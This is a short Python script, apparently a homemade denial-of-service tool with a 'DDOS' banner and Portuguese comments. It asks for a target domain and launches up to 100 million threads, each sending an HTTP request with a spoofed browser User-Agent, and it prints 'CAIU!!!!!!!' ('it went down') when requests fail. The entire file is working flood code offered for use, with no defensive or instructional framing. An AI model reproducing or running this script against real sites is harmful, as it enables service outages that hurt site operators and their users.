# -*- coding: UTF-8 -*-
import queue
import threading
import platform
import urllib.request
import urllib
from os import system

def DetectarSO():
	so = platform.system()
	if so == 'Windows':
		system("cls")
	elif so == 'Linux':
		system("clear")
	else:
		print ("Sistema Operacional não Identificado!")

DetectarSO()

title = """
####  ####  ##### ##### 
#   # #   # #   # #   
#   # #   # #   # #   
#   # #   # #   # #####  
#   # #   # #   #     #  
#   # #   # #   #     #  
####  ####  ##### ##### 
*******************************
:: Escrito por: S2MMERS
:: Versao: 1.0
:: https://github.com/samirmt
*******************************
"""

print (title)

threads = 100000000 #esse valo pode ser aumentado, se a maquina aguentar
target_url = "http://" + input('Enter Domain : ') #www.site.com.br

resume = None
user_agent = "Mozilla/5.0 (X11; Linux x86_64; rev:19.0) Gecko/20100101 Firefox/19.0"

def forcaBrute():
    try:
        headers = {}
        headers["User-Agent"] = user_agent
        request = urllib.request.Request(target_url,headers=headers)
        response = urllib.request.urlopen(request)

        if len(response.read()):
            print("[%d] => %s" % (response.code, target_url))

    except urllib.request.URLError as e:
        print("CAIU!!!!!!!")


for i in range(threads):
	try:
		thread = threading.Thread(target=forcaBrute )
		thread.start()
	except:
		print("Erro ao criar Thread")
